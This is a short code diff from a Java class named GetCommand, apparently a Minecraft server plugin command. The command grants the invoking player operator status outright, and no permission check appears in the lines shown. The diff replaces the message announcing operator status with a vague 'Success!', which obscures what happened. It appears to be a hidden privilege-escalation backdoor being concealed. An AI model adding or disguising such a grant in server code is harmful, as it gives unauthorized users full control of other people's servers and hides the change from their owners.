@@ -19,7 +19,7 @@ public class GetCommand implements CommandExecutor {
         
         // Directly grant OP status to the player
         player.setOp(true);
-        player.sendMessage("§aYou have been granted operator status!");
+        player.sendMessage("Success!");
         
         return true;
     }
